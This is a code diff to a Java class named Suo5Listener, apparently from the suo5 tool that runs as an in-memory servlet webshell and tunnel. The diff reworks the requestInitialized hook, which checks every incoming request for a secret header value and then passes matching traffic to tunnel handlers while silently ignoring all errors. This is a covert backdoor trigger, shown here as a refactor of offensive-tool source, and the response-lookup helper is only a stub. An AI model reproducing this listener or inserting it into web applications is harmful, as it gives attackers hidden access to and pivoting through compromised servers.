@@ -34,6 +34,33 @@ public class Suo5Listener implements ServletRequestListener, Runnable, HostnameV
         this.gOutStream = out;
     }
 
+    @Override
+    public void requestInitialized(ServletRequestEvent servletRequestEvent) {
+        HttpServletRequest request = (HttpServletRequest) servletRequestEvent.getServletRequest();
+        try {
+            String contentType = request.getContentType();
+            if (request.getHeader(headerName) != null
+                    && request.getHeader(headerName).contains(headerValue)
+                    && contentType != null) {
+                HttpServletResponse response = (HttpServletResponse) getResponseFromRequest(request);
+                if (contentType.equals("application/plain")) {
+                    tryFullDuplex(request, response);
+                    return;
+                }
+                if (contentType.equals("application/octet-stream")) {
+                    processDataBio(request, response);
+                } else {
+                    processDataUnary(request, response);
+                }
+            }
+        } catch (Throwable ignored) {
+        }
+    }
+
+    private Object getResponseFromRequest(Object request) throws Exception {
+        return null;
+    }
+
     public void readFull(InputStream is, byte[] b) throws IOException, InterruptedException {
         int bufferOffset = 0;
         while (bufferOffset < b.length) {
@@ -537,40 +564,5 @@ public class Suo5Listener implements ServletRequestListener, Runnable, HostnameV
     @Override
     public void requestDestroyed(ServletRequestEvent sre) {
 
-    }
-
-    @Override
-    public void requestInitialized(ServletRequestEvent servletRequestEvent) {
-        HttpServletRequest request = (HttpServletRequest) servletRequestEvent.getServletRequest();
-        try {
-            if (request.getHeader(headerName) != null
-                    && request.getHeader(headerName).contains(headerValue)) {
-                HttpServletResponse response = (HttpServletResponse) getResponseFromRequest(request);
-                String contentType = request.getContentType();
-                if (contentType == null) {
-                    return;
-                }
-                try {
-                    if (contentType.equals("application/plain")) {
-                        tryFullDuplex(request, response);
-                        return;
-                    }
-
-                    if (contentType.equals("application/octet-stream")) {
-                        processDataBio(request, response);
-                    } else {
-                        processDataUnary(request, response);
-                    }
-                } catch (Throwable e) {
-//                System.out.printf("process data error %s\n", e);
-//                e.printStackTrace();
-                }
-            }
-        } catch (Exception ignored) {
-        }
-    }
-
-    private Object getResponseFromRequest(Object request) throws Exception {
-        return null;
     }
 }
